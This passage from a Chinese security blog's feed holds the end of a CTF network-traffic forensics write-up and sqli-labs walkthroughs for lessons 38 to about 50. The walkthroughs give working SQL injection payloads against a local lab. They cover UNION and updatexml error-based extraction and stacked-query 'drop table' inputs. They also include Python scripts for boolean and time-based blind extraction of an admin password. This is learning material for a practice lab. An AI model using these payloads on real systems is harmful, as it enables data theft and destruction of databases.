rel="noopener">ijnu@test.com</a>得到的密码是什么</h4><p>这一题一开始我还以为答案在mail的那两个包里面，结果还是在对sql操作的那个包上面，上来就直接<code>http contains &quot;ijnu@test.com&quot;</code>啥都没发现，这题目感觉出题没说得太明白。。<br>后面就用<code>tcp contains &quot;ijnu@test.com&quot;</code>把包筛出来，并且追踪流就行了，当然这题也可以用<code>mysql contains &quot;ijnu@test.com&quot;</code> 把包筛出来<br>一样的效果<br><a href="https://imgchr.com/i/PjBV5F" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBV5F.md.png" alt="PjBV5F.md.png"></a><br>这题明显密码经过MD5加密的，所以这题得去somd5上解密<br>这题的答案是<code>edc123!@#</code></p><h4 id="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"><a href="#9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip" class="headerlink" title="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"></a>9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</h4><p>在webone的那个包里面直接搜索就可以得到<br><code>http contains &quot;eth&quot;</code><br><a href="https://imgchr.com/i/PjBm8J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBm8J.md.png" alt="PjBm8J.md.png"></a><br>或者你也可以直接从webtwo的包里面直接看到内网ip，这也对应了题目后面内网渗透之后，用vpn连接的过程<br>也就是从<code>192.168.32.189(内网地址)-&gt;10.3.3.100(连接vpn后重新分配的内网地址)</code><br>所以这题的答案就是<code>10.3.3.100</code></p><h4 id="10、黑客使用了什么账号登陆了mail系统（形式-username-password）"><a href="#10、黑客使用了什么账号登陆了mail系统（形式-username-password）" class="headerlink" title="10、黑客使用了什么账号登陆了mail系统（形式: username/password）"></a>10、黑客使用了什么账号登陆了mail系统（形式: username/password）</h4><p>既然说是mail系统那我们就在mail的两个包里面寻求答案，在mailtwo里面输入<code>http.request.method == &quot;POST&quot; and http contains &quot;password&quot;</code><br>出现很多相同username不同密码的请求，很有可能是在爆破mail系统，在mailtwo1这一个包里面同样的过滤还存在几条成立请求，对比一下时间，这应该是mailtwo还没爆破完mailtwo1这个包继续爆破，在mailtwo包里面的序号28的信息里面对应下面的几条response，发现一名叫wenwenni的人应该是登录成功的，经过了一个check的过程，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loginCheck = <span class="function"><span class="keyword">function</span>(<span class="params">form</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(form.username.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.username.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(form.password.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.password.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">var</span> key_hash = CryptoJS.MD5(<span class="string">'1234567812345678'</span>);</span><br><span class="line"><span class="keyword">var</span> key = CryptoJS.enc.Utf8.pars</span><br></pre></td></tr></table></figure><p>然后回显下面的信息<br><img src="https://s1.ax1x.com/2018/08/30/PjBQDx.png" alt="PjBQDx.png"><br>所以感觉应该有这样的重点字在里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; and ip.addr==192.168.94.59</span><br></pre></td></tr></table></figure><p>于是乎过滤，但是第一个包里面太多了，这一题其实我也不怎么确定，为什么与这么多success的还得继续爆破下去？希望有大佬能讲一讲。。。。<br>之鞥按照常规套路，把在mailtwo1包里面的筛出来的最后一个标记一下，再过滤回http，再来<code>ctrl+shift+N</code>跳到标记处，然后往回找有关登录的请求，找到的第一个请求。。。<br><a href="https://imgchr.com/i/PjBlb6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBlb6.md.png" alt="PjBlb6.md.png"></a></p><p>那个密码需要AES解密，利用上面的算法求出key大概是。。。个人感觉这题最有难度<br><a href="http://encode.chahuo.com/" target="_blank" rel="noopener">http://encode.chahuo.com/</a></p><p>解密出来的结果跟第三题的答案一样。。。。。后来看到有人说这是社工手段，直接套第三题答案，有意思有意思。。。。</p><h4 id="11、黑客获得的vpn-ip是多少"><a href="#11、黑客获得的vpn-ip是多少" class="headerlink" title="11、黑客获得的vpn,ip是多少"></a>11、黑客获得的vpn,ip是多少</h4><p>最后一题在vpntwo这个包里面直接点击统计-&gt;端点，又学到了一种方法<br>看到发包最多的是<code>10.3.4.3</code><br><a href="https://imgchr.com/i/PjB8UO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB8UO.md.png" alt="PjB8UO.md.png"></a><br>所以这个答案就是<code>10.3.4.3</code></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉流量分析还是有点套路的，第一点就是多用点contains语句，模糊匹配一下，关键字靠自己的灵活性以及分析过程得出的结论，个人感觉大部分题目会给出，比如的话有小马上传的时候，你会想到会存在关键字，比如eval,assert之类的东西吗，别人用拼接方式传的马那就另当别论了。。但是还是可以通过菜刀的一些标志来识别的，例如&gt;||&lt;之类符号，2333<br>第二就是各种自动化扫描器的指纹特征，还是得记一下，有点用，第三就是可以通过统计去发现某些ip的发包次数，从而确定可疑ip</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最做流量分析的题目感觉还是不太熟悉，所以最近几篇博客都应该都是练习流量分析的题目了，就从安恒8月赛这个应急响应讲起吧，记录一下加深印象，顺便小结一下自己的做题领悟。
    
    </summary>
    
      <category term="流量分析" scheme="0verwatch.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="流量分析" scheme="0verwatch.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(四)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-4/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-4/</id>
    <published>2018-08-29T12:01:56.000Z</published>
    <updated>2018-08-29T12:15:56.261Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，<a id="more"></a>超过次数就会重新安排<br>代码审计发现是简单的单引号闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;XG5G593V9H&apos;%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,secret_0IMA,3 from XG5G593V9H where id=1%23</span><br></pre></td></tr></table></figure><p>提交获得的信息重置刷新次数</p><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><p>这次变成了14次<br>先构造测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=1) %23</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;8753JZ68TI&apos; %23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,secret_UL8C,3 from 8753JZ68TI %23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><p>构造一下<br><code>http://192.168.100.105/sqlilabs/Less-56/?id=1&quot; %23</code>回显成功后来一直拿他试结果失败了<br>看了源代码才知道原来是括号+单引号的闭合<br>找了一下原因</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM security.users WHERE id=(&apos;1&quot;#&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure><p>在数据库中执行确实能够查到数据，那么问题在哪呢？</p><p>查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如<code>‘1”#’</code>转化为数字值为<code>1</code>，如果是<code>‘11fads’</code>则为<code>11</code>，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) %23</span><br></pre></td></tr></table></figure><p>这样才对<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;HVL992XP27&apos;%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,secret_E2BQ,3 from HVL992XP27%23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><p>尝试一下闭合<br><code>http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,2,3 %23</code>发现这个有回显，常规套路<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;YRA6E572GR&apos; %23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,secret_LA1G,3 from YRA6E572GR %23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><p>这一关变成了5次<br>但是一侧就测试出来是单引号的闭合<br>执行以后发现不可以用union注入。。。因为不返回任何有数据库里面的信息<br>这段代码对其进行了处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br></pre></td></tr></table></figure><p>下面有报错我们可以利用报错注入<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;XXQT0FJQL2&apos;),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select secret_LVSS from XXQT0FJQL2),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><p>同样的报错注入，只需要加个注释，什么单引号双引号闭合都没有<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;CA4PGB5VU5&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select secret_O5UY from CA4PGB5VU5),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><p>这一次是<code>双引号+括号</code>的闭合<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;ZIYD79H66Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select secret_JIPP from ZIYD79H66Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>此题完结</p><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><p>这次是单引号+两个括号的闭合，也是够变态的<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;0NCH5HWI5Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select secret_6IKU from 0NCH5HWI5Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>完结</p><h3 id="Less-62-Less65"><a href="#Less-62-Less65" class="headerlink" title="Less-62-Less65"></a>Less-62-Less65</h3><p>都是一样的都需要盲注，但是给的次数太少，很难跑出来，等我算法学得好一点再去把脚本写出来吧</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>终于把这个SQL注入的平台的题目给做完了，最近感冒难受的一批。。。撒花~~~</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-54&quot;&gt;&lt;a href=&quot;#Less-54&quot; class=&quot;headerlink&quot; title=&quot;Less-54&quot;&gt;&lt;/a&gt;Less-54&lt;/h3&gt;&lt;p&gt;从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(三)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-3/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-3/</id>
    <published>2018-08-29T12:01:31.000Z</published>
    <updated>2018-08-29T12:15:59.167Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>从这一关开始其实就是堆叠注入，就是用分号连接两个不同的语句，然后执行这几条语句，进行增删改查，<a id="more"></a>但是比赛中是不大会用的，但是对于这几个环境我还是偏向union注入所以我还是以union注入的方式显示</p><p>换了mysqli的连接方式，但是换汤不换药<br>直接单引号闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=-1&apos; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>报错尝试一下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>这个题直接注释掉后面的部分就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-39/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>普通的union注入就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1234&apos;) union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>也可以尝试一下盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1&apos;) and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><p>union注入也可以，盲注也可以<br>union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-41/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-41/?id=1 and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><p>这个题目查看源码你会发现登陆页面的password是没有过滤好的，我么可以利用此处进行堆叠注入增加，我们可以利用这点直接删库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><p>跟上一题一样password没有过滤<br>只是查询的语句改变了，我么需要闭合括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;);drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><p>跟上一题同样的思路，只是需要单引号闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><p>感觉跟43题没啥区别啊。。。</p><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p>从这一关开始正式进入order by注入<br>查看一下源码语句是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br></pre></td></tr></table></figure><p>order by利用的三种方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、直接添加注入语句 ?sort=(select ******)</span><br><span class="line">2、利用一些函数，例如rand函数，?sort=rand(sql语句)，而且此处rand(true)和rand(false)是不相同的。</span><br><span class="line">3、利用and，例如?sort=1 and (加sql语句)</span><br></pre></td></tr></table></figure><p>这一题目可以直借用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-46/?sort=rand(updatexml(1,concat(0x7e,database(),0x7e),1))</span><br></pre></td></tr></table></figure><p>也可以用盲注，利用表格最后一行去区分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-46/?sort=rand(ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125;)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Min+Max)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;td&gt;superman&lt;/td&gt;&lt;td&gt;genious&lt;/td&gt;&lt;/tr&gt;&lt;/font&gt;&lt;/table&gt;'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>这一次的order by注入需要闭合单引号<br>来个报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-47/?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>跟46题一样的盲注。</p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>一直在尝试下面这两句话，发现一直没效果，奇了怪，自我感觉没问题。。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and rand(ascii(substr((select database()),1,1))&gt;127)%23</span><br><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and ascii(substr((select database()),1,1))&gt;1%23</span><br></pre></td></tr></table></figure><p>再来尝试一下时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-49/?sort=1' and if(((ascii(substr((select password from users where username="admin"),&#123;_&#125;,1)))=&#123;__&#125;),sleep(4),false) --+'''</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">67</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(payload,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>直接出来结果，这尼玛什么操作。。</p><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>这可以直接报错注入</p><figure 